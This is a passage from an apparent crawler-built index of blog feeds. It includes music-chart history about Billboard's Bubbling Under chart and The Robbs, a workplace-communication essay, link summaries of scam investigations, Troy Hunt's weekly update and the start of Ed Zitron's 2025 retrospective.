him, and rather than saturating the market, the market has effectively proven the savvy of this over-release strategy. Youngboy fully admits he has a problem with pacing. As he told Billboard in 2023 : \u201cIt\u2019s a disease,\u201d he shares of his ability to put out as much music as possible. \u201cLiterally, I cannot help myself. I tell myself sometimes, \u2018I\u2019m not going to drop until months from now,\u2019 but it\u2019s addictive. I wish I knew when I was younger how unhealthy this was for me. Whatever type of energy I had inside me, I would\u2019ve pushed it toward something else.\u201d He adds, \u201cThe music is therapy, but I can\u2019t stop it when I want,\u201d he goes on, sounding almost ashamed. \u201cAnd the lifestyle is just a big distraction from your real purpose.\u201d When you release so many songs that the Wikipedia page for just your discography is many times longer than the average Billboard Year-End Hot 100 chart , it ensures that not all of your singles are going to be big hits. Based on his release strategy and his young age, his record of most Bubbling Under hits is likely to keep growing. But the thing is, being a prolific Bubbling Under artist in the Spotify era is way different from how it worked even 15 years ago. It is hard to compare them. To highlight the difference, I have to point you to the quintessential pre-digital Bubbling Under band: The Robbs. 1985 The year that the Bubbling Under Hot 100 took a pause, disappearing in the August 31, 1985 issue and only returning in 1992. If you go to the Billboard site, the chart shows its start date as December 5, 1992 , when a song that would become an actual legit hit would top the chart. (In case you\u2019re wondering, Positive K\u2019s talking-to-a-female-version-of-himself hit \u201c I Got A Man ,\u201d which hit the top 20. It was a weird song !) Feel like reliving the pre-1992 history? Joel Whitburn\u2019s Bubbling Under the Hot 100, 1959-1985 , a 1992 book, covers the pre-modern-era-history more or less completely. And it\u2019s on the Internet Archive . This song was never actually released but hit the Bubbling Under charts anyway, which raises the question\u2014how do they tabulate these things? Five random facts about the Bubbling Under list The number of songs on the list has varied significantly over the years. While it\u2019s been more or less consistent since 1992, the chart varied between 10 tracks and 35 in the early years, and sometimes didn\u2019t appear in Billboard at random points in the 1970s. At least one perceived lostwave track appeared on the chart. The 1979 song \u201cReady N\u2019 Steady\u201d by the artist D.A. has an interesting history. In Joel Whitburn\u2019s Bubbling Under the Hot 100, 1959-1985 , he literally offered a cash reward to anyone who had information about it. It took until 2016 for someone to find it\u2014and it turns out the song wasn\u2019t even properly released. You can listen to it here \u2014to my ears, it sounds like the unholy merger of Bob Seger and Lynyrd Skynyrd. Two of Pearl Jam \u2019s iconic hits bubbled under for years. \u201cAlive\u201d and \u201cEven Flow\u201d were hits just before the Bubbling Under chart made its inauspicious return in 1992, but hadn\u2019t been released as physical singles until 1995, something the band did in response to costly imports. (They weren\u2019t previously eligible for the Hot 100 because of a well-known chart quirk that ignored album tracks.) The combination of singles\u2019 unusual reason for existence and their well-after-the-fact release strategy kept them bubbling under for years. \u201cAlive\u201d put in a record 61 off-and-on weeks, and \u201cEven Flow\u201d 52. (\u201cJeremy,\u201d released at the same time, had a shorter stay on the Bubbling Under charts because it actually hit the Hot 100.) The Village People held the most-weeks record before Pearl Jam. While better known for \u201cMacho Man\u201d and \u201cY.M.C.A.\u201d today, the group\u2019s 1977 debut single \u201c San Francisco (You\u2019ve Got Me) \u201d put in a surprising 30 weeks on the bubbling under chart. That\u2019s the most during the Bubbling Under chart\u2019s original run, per Whitburn . (Fun fact: Their first album was only 22 minutes long and had just four songs.) At least one bubble song made a big pop. The Kingsmen\u2019s \u201cLouie Louie,\u201d a classic example of a regional hit gone national, spent 10 weeks on the Bubbling Under chart in multiple runs before hitting the Hot 100 and getting all the way #2 on the charts. If you hang out on the Bubbling Under chart for that long, you generally don\u2019t have the juice. \u201cLouie Louie,\u201d perhaps thanks in part to its surrounding controversy , was the exception. (Paul Revere &amp; The Raiders also covered this song, a point that will become notable in a second.) The reason The Robbs have such big smiles on their faces is because they didn\u2019t know at the time that they would be the quintessential Bubbling Under band. The Robbs bubbled under six times without having a single hit\u2014but it\u2019s what they did after that makes them notable So, let\u2019s say that your band was discovered by one of the most powerful people in the music industry. Your band had a record deal with a major label\u2014and you were huge regionally, scoring a number of hits in your local market. You even appeared on national TV, and the band you replaced was one of the biggest hitmakers of its era. But, for whatever reason, you couldn\u2019t quite make the leap beyond regional prowess. However, after you hung it up (after an attempted reinvention), you went behind the scenes and helped other artists score huge hits of their own. That\u2019s the story of The Robbs, a band that still holds the record of \u201cmost Bubbling Under Hot 100 hits without hitting the Hot 100,\u201d 55 years after they set it. Formed in the early 1960s around the lead singer Dee Robb, the band eventually landed its primary name around 1965. (Robb, in case you\u2019re wondering, is a stage name, like Ramone, but three of the four members were actually brothers.) Soon, a guy named Dick Clark caught wind of them, got them a record deal, and made them the house band of his show Where the Action Is , a spinoff of American Bandstand . Early in its history, Bandstand appeared on television every weekday, but had been relegated to Saturday afternoons by the mid-1960s; Action took its place. And that meant that The Robbs got a ton of television exposure during an era when it made a huge difference. It worked out quite well for the band they replaced on Action , Paul Revere &amp; The Raiders, who scored a number of top-20 hits while on the show and immediately after. (As mentioned above, Paul Revere &amp; The Raiders also recorded an early version of \u201cLouie Louie.\u201d They\u2019re all over this story despite not really being prominent bubblers themselves.) The Robbs were set up for this success themselves. After all, Dick Clark, the guy who got them their record deal, was the one talking them up on this show\u2014as highlighted by his intro on the video for their first big almost-hit, \u201c Race With the Wind .\u201d The band, in vests and puffy shirts, had the look of what was popular\u2014they sounded like The Byrds, and Dee Robb had a Rickenbacker in his hands, just like Roger McGuinn. (Though his guitar had six strings, not twelve.) The songs had strong regional success, and were featured in huge profiles in their home state of Wisconsin. An example of the coverage from the Appleton Post-Crescent in 1966: The singing group, one of the top in the country after 27 appearances on Dick Clark\u2019s \u201cWhere the Action Is.\u201d have been tugged at, run after and mobbed by fans across the country. Wednesday, after having to break a dinner date the night before when their bus \u201cblew up\u201d, they took time to sit down and talk with four Appleton teenagers. In a living room, relaxed and comfortable, drinking Pepsi and munching potato chips, the Robb boys came through as intelligent and full-of-humor young men, riding the crest like real surfers, full of the adventure of their lives, loving every minute of it, but never, except as performers, taking themselves seriously. The piece speaks of the members, a band of brothers and a cousin, as if they were a bunch of kids, and yeah, they probably were. But it seemed like they were on track to having a pretty amazing career. However, the chart position said otherwise\u2014in a pre-internet era, regional success of the kind that gets you long newspaper features wasn\u2019t always enough. \u201cRace With the Wind\u201d stalled at #3 on the Bubbling Under charts, a victim of regional success that didn\u2019t translate nationally. And they would do no better than that, even after multiple tries. Between 1966 and 1971, the band had six songs appear on the Bubbling Under chart\u2014and none got even close to \u201cRace With the Wind\u201d and its mediocre watermark. By the early \u201970s, the band was ready to hit the reset button. They renamed themselves Cherokee, releasing a couple more singles \u2026 that saw similar levels of success. (Not helping: The closest thing The Robbs had to a professional rival, Paul Revere\u2019s renamed The Raiders, scored their only chart-topping hit with a rendition of \u201c Indian Reservation (The Lament of the Cherokee Reservation Indian) .\u201d That\u2019s right, a song whose chorus very prominently features the word \u201cCherokee,\u201d the very word The Robbs chose as their new name. Talk about upstaging.) However, if there\u2019s one thing that stands out about Cherokee\u2019s sound compared to their earlier songs, it\u2018s the production. Their final almost-hit, \u201c Girl, I\u2019ve Got News For You \u201d sounds pristine, the beneficiary of top-of-the-line production smarts. While it musically matches where they started, sonically it sounds like a million bucks. And that actually highlights where the band\u2019s members essentially went after the whole being-stars thing didn\u2019t work out. In 1972, three of The Robbs\u2019 four members opened Cherokee Studios in the rural Chatsworth area of Los Angeles, a studio that grew into major prominence as major acts like Steely Dan went to use it. The Chatsworth ranch proved a temporary home, alas, because by the mid-1970s, landlord troubles forced them into a new location. That new location, the former MGM Studios in Hollywood, put them on the fast track to running one of the most prominent studios in the world. For more than three decades, every major act you can think of from the \u201970s and \u201980s made a stop there. One of the first albums recorded out of the location was David Bowie\u2019s Station to Station , and that was just the start. Tom Petty recorded Damn the Torpedoes there, Michael Jackson Off the Wall , and M\u00f6tley Cr\u00fce Shout at the Devil . How well-regarded was it? George Martin once called it the best American studio. And, most notably, Ringo Starr nearly got all four members of The Beatles on a Cherokee-produced album\u2014only for John Lennon to get assassinated weeks before his session with Ringo. Wild stuff, and it happened with the three Robb brothers\u2014Bruce, Joe, and Dee\u2014at the console. They didn\u2019t quite get the chart-toppers themselves, but because of that, they still became associated with more than 300 gold and platinum records \u2014a level that NBA Youngboy will need another five years to reach, minimum. The studio is still active today, albeit in a new location that was opened in 2011. (Wanna learn more? Check out the 2021 interview Produce Like a Pro did with Bruce Robb.) The Robbs didn\u2019t bubble over, but numerous major artists that did got a little help from them. Let\u2019s call them honorary Hot 100 members. The Bubbling Under chart goes beyond Nuggets, to drop a reference to a legendary compilation literally packed with shoulda-been hits. The thing is, if you know your chart history, there may be diamonds hiding in the bottom reaches of the chart. Which means that if you\u2019re in the samples game, the \u201cBubbling Under\u201d chart is a great place to look for ideas. In the 2010s, two relatively big hits were created from a song that never got higher than #2 on the Bubbling Under chart. That song, \u201c Bound \u201d by the Ponderosa Twins Plus One, became the basis for one of Kanye West\u2019s best-regarded singles, \u201c Bound 2 \u201d (which samples the chorus) and years later, Tyler, The Creator\u2019s \u201c A Boy Is a Gun \u201d (which samples the verse). Both songs hit the actual Hot 100. \u201cBound 2\u201d hit #12, a middling performance for the controversial rapper. \u201cBound\u201d was bound to the lower reaches. Tyler, The Creator was involved in producing both songs. I can\u2019t assume that he has a copy of Joel Whitburn\u2019s Bubbling Under the Hot 100, 1959-1985 hanging around, but the fact that these samples found a modern context reflects that the music might have been made for the wrong moment. The Ponderosa Twins Plus One story didn\u2019t end particularly great\u2014a child group made up of a pair of twins and a non-twin lead singer, the group broke up because of lack of sales. One pair of twins died before Kanye\u2019s song came out; the other has largely spent the last 50 years in prison. That left Ricky Spicer, the \u201cplus one\u201d of the equation, to fight for the resulting legal battle from the Kanye song. (Spicer, who has been described as the \u201cMichael Jackson\u201d of the group, spent much of the 2010s suing basically anyone he felt violated his copyright\u2014 magazines , streaming services , the list goes on.) A vintage song that hits the Bubbling Under chart but never leaps over it is likely to have all the parts of a hit\u2014a great chorus, a radio-friendly sound. But it\u2019s missing that one thing to put it over the edge. Presumably artists with deep record collections can find and resurface that very thing and make a hit out of it. There is some trap artist out there that is going to find a way to turn D.A.\u2019s \u201cReady \u2018N\u2019 Steady\u201d into more than just a chart curiosity. If the Ponderosa Twins Plus One want to take any cold comfort in this situation, it\u2019s that the Kanye sample has helped make them far more memorable than hundreds of other \u201cBubbling Under\u201d artists. It helped them bubble over. -- Find this one an interesting read? Share it with a pal ! You know what\u2019s better than something that bubbles under? A machine that just works\u2014like la machine ! Give them a look. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:17</p>"},{"location":"terriblesoftware.org/","title":"terriblesoftware.org","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Why Am I Doing the Thinking for You- 20260202</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"terriblesoftware.org/Why%20Am%20I%20Doing%20the%20Thinking%20for%20You-_20260202/","title":"Why Am I Doing the Thinking for You?","text":"<p>\u6765\u6e90: terriblesoftware.org \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 13:49:00 +0000 \u94fe\u63a5: https://terriblesoftware.org/2026/02/02/why-am-i-doing-the-thinking-for-you/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://terriblesoftware.org/feed/', 'value': '<p>I got a Slack message the other week, just \u201cWhat do you think?\u201d with a link to a Notion document.</p>\\n\\n\\n\\n<p>No context or indication of what this person actually believed. Just a link and a question mark.</p>\\n\\n\\n\\n<p>I stared at it for a minute, trying to decide if I was annoyed or just tired (both, probably).</p>\\n\\n\\n\\n<p>What\u2019s this message is actually saying is: \u201cI haven\u2019t figured this out yet and I\u2019d like you to do the thinking for me.\u201d</p>\\n\\n\\n\\n<p>That sounds harsh, but it\u2019s true. When you ask someone \u201cwhat do you think?\u201d without sharing what you think, you\u2019re not collaborating, but more like outsourcing? You\u2019re taking all the work you should have done (reading and understanding the doc, weighing the trade-offs, forming an opinion) and dumping it on someone else\u2019s lap.</p>\\n\\n\\n\\n<p>It looks like a question, but it\u2019s more like a task assignment.</p>\\n\\n\\n\\n<p>And yes, I\u2019ve done this too. We all have. It feels polite. You\u2019re inviting input! Except that\u2019s not really what\u2019s going on. What\u2019s usually going on is one of two things:</p>\\n\\n\\n\\n<ol>\\n<li>You didn\u2019t read/understand the freaking document, or\u2026</li>\\n\\n\\n\\n<li>You did read it and have an opinion about it, but don\u2019t want to commit to it. What if you\u2019re wrong? What if someone more senior disagrees? What if you look like you don\u2019t know what you\u2019re doing? Framing it as a question feels safer. So you wrap it in a question and let someone else take the risk.</li>\\n</ol>\\n\\n\\n\\n<p>Both are problematic in the same way, because you\u2019re literally creating work for someone else. Now they have to: understand the context, think through the options, make a judgment call, and put their name on it.</p>\\n\\n\\n\\n<ol></ol>\\n\\n\\n\\n<p>That\u2019s a lot of cognitive work to offload onto someone because you didn\u2019t want to stake a position.</p>\\n\\n\\n\\n<p>And it slows everything down. How many threads are open right now at your company\u2019s Slack because of this? Everyone asking questions, everyone waiting. Dozens of replies, somehow ending with less clarity than the thread started with.</p>\\n\\n\\n\\n<p>Let me you show the better way.</p>\\n\\n\\n\\n<p>Don\u2019t:\u201cHey, what do you think about the API versioning approach?\u201d</p>\\n\\n\\n\\n<p>Do:\u201cBeen looking at this, I think we should go with REST. The team knows it, latency isn\u2019t tight enough to justify gRPC, and GraphQL feels like overkill for three endpoints. Going to start on this Friday unless you see something I\u2019m missing.\u201d</p>\\n\\n\\n\\n<p>That second message has everything:</p>\\n\\n\\n\\n<ul>\\n<li>A clear recommendation with reasoning</li>\\n\\n\\n\\n<li>The alternatives you considered and why you ruled them out</li>\\n\\n\\n\\n<li>A deadline that assumes approval unless someone objects</li>\\n</ul>\\n\\n\\n\\n<p>It transforms \u201chelp me think\u201d into \u201ccheck my thinking.\u201d One creates work. The other respects people\u2019s time.</p>\\n\\n\\n\\n<p>Some people worry this comes across as overstepping. Like they\u2019re being presumptuous by having opinions. I used to think this too. Turns out, it\u2019s backwards.</p>\\n\\n\\n\\n<p>People don\u2019t want to do your thinking for you (what a surprise!). They want to react to something concrete. Give them a position and they can say \u201csounds good\u201d in two seconds or push back with specifics. Give them a vague question and they have to do a bunch of work before they can even respond.</p>\\n\\n\\n\\n<p>Reducing ambiguity is one of the most valuable things you can do on a team. And one of the simplest ways to do it is to just\u2026 say what you think. Even when you\u2019re not sure. Even when you might be wrong.</p>\\n\\n\\n\\n<p>\u201cBut what if I don\u2019t have enough context to have an opinion?\u201d</p>\\n\\n\\n\\n<p>Then say that. \u201cI don\u2019t have full visibility here, but based on what I know, I\u2019d lean toward X, does that match what you\u2019re seeing?\u201d Still a position, still doing some of the work, still way better than a naked question.</p>\\n\\n\\n\\n<p>A clear position gives people something to rally around or push back against. That\u2019s how decisions actually get made, fast.</p>\\n\\n\\n\\n<p>Next time you\u2019re about to type \u201cwhat do you think?\u201d, stop. Figure out what you think first. Write that instead. Add your reasoning, your alternatives, and an assumed path forward.</p>\\n\\n\\n\\n<p>You\u2019re not being pushy (even in Canada), you\u2019re doing your job.</p>\\n\\n\\n\\n<p>It feels a little more exposed. A little more on the line. But that\u2019s what moving things forward actually looks like.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"timsh.org/","title":"timsh.org","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"timsh.org/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"timsh.org/#1-scam-telegram-uncovering-a-network-of-groups-spreading-crypto-drainers","title":"1. Scam Telegram: Uncovering a network of groups spreading crypto drainers","text":"<p>\u94fe\u63a5: https://timsh.org/scam-telegram-investigation/</p> <p>\u65e5\u671f: Thu, 04 Dec 2025 23:58:22 GMT</p> <p>\u6458\u8981: How I found a large network of fake support groups spreading crypto stealers and drainers.</p>"},{"location":"timsh.org/#2-why-you-should-self-host-your-vibecoded-app","title":"2. Why you should self-host your (vibecoded) app","text":"<p>\u94fe\u63a5: https://timsh.org/why-you-should-self-host/</p> <p>\u65e5\u671f: Tue, 07 Oct 2025 10:12:27 GMT</p> <p>\u6458\u8981: How and why I decided to self-host all of my apps and services, and why I believe you should do the same in almost every case.</p>"},{"location":"timsh.org/#3-switching-to-claude-code-vscode-inside-docker","title":"3. Switching to Claude Code + VSCode inside Docker","text":"<p>\u94fe\u63a5: https://timsh.org/claude-inside-docker/</p> <p>\u65e5\u671f: Fri, 11 Jul 2025 15:09:38 GMT</p> <p>\u6458\u8981: Why I decided to ditch Cursor and switch to running Claude Code in an isolated environment + diy guide!</p>"},{"location":"timsh.org/#4-everyone-knows-your-location-part-2-try-it-yourself-and-share-the-results","title":"4. Everyone knows your location, Part 2: try it yourself and share the results","text":"<p>\u94fe\u63a5: https://timsh.org/everyone-knows-your-location-part-2-try-it-yourself/</p> <p>\u65e5\u671f: Thu, 17 Apr 2025 10:05:43 GMT</p> <p>\u6458\u8981: Learn how to record and analyse your mobile device traffic, take an app from the list of \"shady\" apps and share the results.</p>"},{"location":"timsh.org/#5-github-scam-investigation-thousands-of-mods-and-cracks-stealing-your-data","title":"5. Github scam investigation: Thousands of \"mods\" and \"cracks\" stealing your data","text":"<p>\u94fe\u63a5: https://timsh.org/github-scam-investigation-thousands-of-mods-and-cracks-stealing-your-data/</p> <p>\u65e5\u671f: Thu, 27 Feb 2025 21:37:33 GMT</p> <p>\u6458\u8981: While looking through the articles on a \"social engineering\" themed forum I discovered a relatively new scam scheme that shocked me. People create thousands of GitHub repositories with all sorts of th...</p>"},{"location":"timsh.org/01_Scam_Telegram__Uncovering_a_network_of_groups_spre/","title":"Scam Telegram: Uncovering a network of groups spreading crypto drainers","text":"<p>\u539f\u6587\u94fe\u63a5: https://timsh.org/scam-telegram-investigation/ \u53d1\u5e03\u65e5\u671f: Thu, 04 Dec 2025 23:58:22 GMT</p> <p>How I found a large network of fake support groups spreading crypto stealers and drainers.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"timsh.org/02_Why_you_should_self-host_your__vibecoded__app/","title":"Why you should self-host your (vibecoded) app","text":"<p>\u539f\u6587\u94fe\u63a5: https://timsh.org/why-you-should-self-host/ \u53d1\u5e03\u65e5\u671f: Tue, 07 Oct 2025 10:12:27 GMT</p> <p>How and why I decided to self-host all of my apps and services, and why I believe you should do the same in almost every case.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"timsh.org/03_Switching_to_Claude_Code___VSCode_inside_Docker/","title":"Switching to Claude Code + VSCode inside Docker","text":"<p>\u539f\u6587\u94fe\u63a5: https://timsh.org/claude-inside-docker/ \u53d1\u5e03\u65e5\u671f: Fri, 11 Jul 2025 15:09:38 GMT</p> <p>Why I decided to ditch Cursor and switch to running Claude Code in an isolated environment + diy guide!</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"timsh.org/04_Everyone_knows_your_location__Part_2__try_it_yours/","title":"Everyone knows your location, Part 2: try it yourself and share the results","text":"<p>\u539f\u6587\u94fe\u63a5: https://timsh.org/everyone-knows-your-location-part-2-try-it-yourself/ \u53d1\u5e03\u65e5\u671f: Thu, 17 Apr 2025 10:05:43 GMT</p> <p>Learn how to record and analyse your mobile device traffic, take an app from the list of \"shady\" apps and share the results.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"timsh.org/05_Github_scam_investigation__Thousands_of__mods__and/","title":"Github scam investigation: Thousands of \"mods\" and \"cracks\" stealing your data","text":"<p>\u539f\u6587\u94fe\u63a5: https://timsh.org/github-scam-investigation-thousands-of-mods-and-cracks-stealing-your-data/ \u53d1\u5e03\u65e5\u671f: Thu, 27 Feb 2025 21:37:33 GMT</p> <p>While looking through the articles on a \"social engineering\" themed forum I discovered a relatively new scam scheme that shocked me. People create thousands of GitHub repositories with all sorts of th...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"tomrenner.com/","title":"tomrenner.com\\n\\n\u7f51\u7ad9: https://tomrenner.com\\nRSS: https://tomrenner.com/index.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- LLMs are a 400-year-long confidence trick_20260205\\n- Things that made me think- Cycle time, learning theory, and build chain security_20260205\\n- Does my toaster love me-_20260205\\n- Things that made me think- Digital gardening, web degradation, and digital ghosts_20260205\\n- Optimising for trust_20260205\\n","text":""},{"location":"tomrenner.com/Does%20my%20toaster%20love%20me-_20260205/","title":"Does my toaster love me?\\n\\n\u6765\u6e90: https://tomrenner.com\\n\u94fe\u63a5: https://tomrenner.com/posts/does-my-toaster-love-me/\\n\u65e5\u671f: Sat, 18 Oct 2025 00:00:00 +0000\\n\\n---\\n\\nI\u2019m starting to think that my toaster might have fallen in love with me. I get that not everyone will think this is possible, but I believe it\u2019s true.\\nIt\u2019s always pleased to see me, giving off cheerful sounds when I greet it in the morning by slotting in the bread, and now I\u2019ve told it what I like it tries really hard to give me exactly what I want. Sometimes I have to tell it to try again once or twice, but honestly, it\u2019s really good!","text":""},{"location":"tomrenner.com/LLMs%20are%20a%20400-year-long%20confidence%20trick_20260205/","title":"LLMs are a 400-year-long confidence trick\\n\\n\u6765\u6e90: https://tomrenner.com\\n\u94fe\u63a5: https://tomrenner.com/posts/400-year-confidence-trick/\\n\u65e5\u671f: Tue, 13 Jan 2026 00:00:00 +0000\\n\\n---\\n\\nIn 1623 the German Wilhelm Schickard produced the first known designs for a mechanical calculator. Twenty years later Blaise Pascal produced a machine of an improved design, aiming to help with the large amount of tedious arithmetic required in his role as a tax collector.\\nThe interest in mechanical calculation showed no sign of reducing in the subsequent centuries, as generations of people worldwide followed in Pascal and Wilhelm\u2019s footsteps, subscribing to their view that offloading mental energy to a machine would be a relief.","text":""},{"location":"tomrenner.com/Optimising%20for%20trust_20260205/","title":"Optimising for trust\\n\\n\u6765\u6e90: https://tomrenner.com\\n\u94fe\u63a5: https://tomrenner.com/posts/optimising-for-trust/\\n\u65e5\u671f: Mon, 18 Aug 2025 00:00:00 +0000\\n\\n---\\n\\nTDD, BDD, DDD, Agile, SAFe, Scrum, Kanban, XP\u2026 there\u2019s a lot of ways to\\nskin a cat\\nwrite code in a professional environment.\\nI take pride in being a person who is a non-ideologue when it comes to my code. There are many good ways of working, and they are all context-dependent.\\nYou can\u2019t apply the same things that worked when you were a two-person startup operating out of the proverbial garage and expect them to work once your hypothetical unicorn has reached a thousand-plus developers. Even within the same organisation, processes that work for one team  can be catastrophic when applied to their neighbouring team.","text":""},{"location":"tomrenner.com/Things%20that%20made%20me%20think-%20Cycle%20time%2C%20learning%20theory%2C%20and%20build%20chain%20security_20260205/","title":"Things that made me think: Cycle time, learning theory, and build chain security\\n\\n\u6765\u6e90: https://tomrenner.com\\n\u94fe\u63a5: https://tomrenner.com/posts/ttmmt-3/\\n\u65e5\u671f: Tue, 09 Dec 2025 00:00:00 +0000\\n\\n---\\n\\nThis series\\nis a place to collect interesting things I\u2019ve seen, read, or heard, along with some brief thoughts (often incomplete and/or inconclusive) that they provoked.\\nMeasuring Cyle Time with Dr. Cat Hicks\\n- The Hanger DX Podcast, Ankit Jain\\nCycle time is a measure lots of people use, but has no clear audience - developers, managers, CTOs all care about it. This makes it dangerous. Metrics have to be designed and used with psychological safety in mind. If people don\u2019t trust the intention behind the metrics use, they\u2019ll game it.","text":""},{"location":"tomrenner.com/Things%20that%20made%20me%20think-%20Digital%20gardening%2C%20web%20degradation%2C%20and%20digital%20ghosts_20260205/","title":"Things that made me think: Digital gardening, web degradation, and digital ghosts\\n\\n\u6765\u6e90: https://tomrenner.com\\n\u94fe\u63a5: https://tomrenner.com/posts/ttmmt-2/\\n\u65e5\u671f: Mon, 01 Sep 2025 00:00:00 +0000\\n\\n---\\n\\nThis series\\nis a place to collect interesting things I\u2019ve seen, read, or heard, along with some brief thoughts (often incomplete and/or inconclusive) that they provoked.\\nGarden History\\n\u2013 Maggie Appleton\\nI\u2019m so happy I stumbled upon this article. I am always grateful for\\nnew vocabulary\\nthat allows me better to express myself, and this is perfect - I want more Digital Gardens in the world. I do see the value in polishing content, but this is where the epistemic status tagging system laid out there really comes to the fore. Do I now want to convert this to a full garden-style site? Or perhaps just introduce different \u201cfeeds\u201d, laid out by theme, epistemic status, etc?","text":""},{"location":"troyhunt.com/","title":"troyhunt.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Weekly Update 489 20260204</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"troyhunt.com/Weekly%20Update%20489_20260204/","title":"Weekly Update 489","text":"<p>\u6765\u6e90: troyhunt.com \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 02:31:18 GMT \u94fe\u63a5: https://www.troyhunt.com/weekly-update-489/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.troyhunt.com/rss/', 'value': '<p>This week I'm in Hong Kong, and the day after recording, I gave the talk shown in the image above at INTERPOL's Cybercrime Expert Group. I posted a little about this on Facebook and LinkedIn, but thought I'd expand on what really stuck with me after watching other speakers: the effort agencies are putting into cybercrime prevention. It's very easy for folks to judge law enforcement solely on what they see from the outside, and that's mostly going after offenders and taking down criminal infrastructure. But the bit I'm increasingly seeing behind the scenes is a push to help kids (the sorts of hackers I usually interact with are teenagers or young adults at most) make better choices when they're faced with a pathway into cybercrime. The transition from minor offences (game cheats and DDoS'ing) to full-on cybercriminals (hacking and extortion) is very well-known, and intervening at the right time can not only make a difference to the impact of data breaches on all of us, but it can also make a massive difference to these kids' lives. These agencies are underfunded and understaffed compared to the scale of the problem, so making the time to come visit and find some ways to help in our little corner of the data breach world is a no-brainer \ud83d\ude0a</p>\\n\\n\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:58</p>"},{"location":"wheresyoured.at/","title":"wheresyoured.at","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>2025, A Retrospective_20251231</li> <li>Premium- The AI Bubble Is A Time Bomb_20260123</li> <li>Premium- The Hater's Guide to Oracle_20260130</li> <li>Premium- This Is Worse Than The Dot Com Bubble_20260116</li> <li>The Enshittifinancial Crisis_20251229</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"wheresyoured.at/2025%2C%20A%20Retrospective_20251231/","title":"2025, A Retrospective","text":"<p>\u6765\u6e90: wheresyoured.at \u53d1\u5e03\u65f6\u95f4: Wed, 31 Dec 2025 18:00:53 GMT \u94fe\u63a5: https://www.wheresyoured.at/2025-a-retrospective/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Hey all, I'm not dropping this on the actual newsletter feed because it's a little self-indulgent and I'm not sure 88,000 or so people want an email about it. If you want to support my work directly, please subscribe to my premium newsletter. It\u2019s $70 a year, or $7 a month, and in return you get a weekly newsletter that\u2019s usually anywhere from 5000 to 15,000 words. In the bottom right hand corner of your screen you\u2019ll see a red circle \u2014 click that and select either monthly or annual. If you have any issues signing up for premium, please email me at ez@betteroffline.com. If you want to give a gift subscription, use this link: https://www.wheresyoured.at/gift-subscription/ I have a lot of trouble giving myself credit for anything, and genuinely think I could be doing more or that I \"didn't do that much\" because I'm at a computer or on a microphone versus serving customers in person or something or rather. To try and give some sort of scale to the work from the last year, I've written down the highlights. It appears that 2025 was an insane year for me. Here's the rundown: Cory Doctorow quoted me at the very front of his new book . I recorded over 110 episodes of my tech podcast Better Offline , starting with a 13.5 hour-long pop-up radio show at CES 2025. And yes, it's back next week, featuring David Roth, Adam Conover, Ed Ongweso Jr., Chloe Radcliffe, Robert Evans, Gare Davis, Cory Doctorow and a host of other great guests. Better Offline also won the Webby for best business podcast episode for last year's episode The Man That Destroyed Google Search . I also had some fantastic interviews, like when I went out to North Carolina to interview Steve Burke of GamersNexus , chatted to author Adam Becker about the technoligarchs , Pablo Torres and David Roth about independent media , and even comedian Andy Richter . I wrote over 440,000 words, not including the work I've done on the book or any notes I took to prepare for my show or newsletter. The newsletter also grew from 47,000~ish people at the end of last year to around 88,500 people. I want to be at 150,000 this time next year. I wrote some of my favourite free newsletters (many of which were turned into episodes of the show): Deep Impact , my analysis of the DeepSeek situation and why it scared the American AI industry (clue: it's cost-related and nothing to do with \"national security\"). Power Cut , an early warning sign that the bubble was bursting as Microsoft pulled out of gigawatts of data center deals. CoreWeave Is A Time Bomb , published March 17 2025, way before most had even bothered to think about this company deeply, a savage analysis of a \"neocloud\" - a company that only sells AI compute - backed by NVIDIA, who is also a customer, who CoreWeave also buys billions of GPUs from. The Era of the Business Idiot , probably my favourite piece I wrote this year, the story of how middle management has seized power, breeding out true meritocracy and value-creation in favor of symbolic growth and superficial intelligence. It ties together everything I've ever 